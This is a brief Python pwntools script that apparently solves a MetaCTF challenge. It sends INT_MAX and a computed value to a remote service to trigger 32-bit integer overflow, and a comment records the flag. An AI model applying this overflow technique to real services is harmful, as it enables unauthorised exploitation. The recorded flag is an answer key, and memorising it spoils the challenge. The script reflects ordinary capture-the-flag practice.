from pwn import *

r = remote("host5.metaproblems.com", 5030)
max_int = 2147483647
to_add = 0xFFFFFFFF - max_int - 1337 + 1

r.sendlineafter(b"integer: ", str(max_int).encode())
r.sendlineafter(b"integer: ", str(to_add).encode())

r.interactive()

# MetaCTF{c0unting_beyond_infinity}
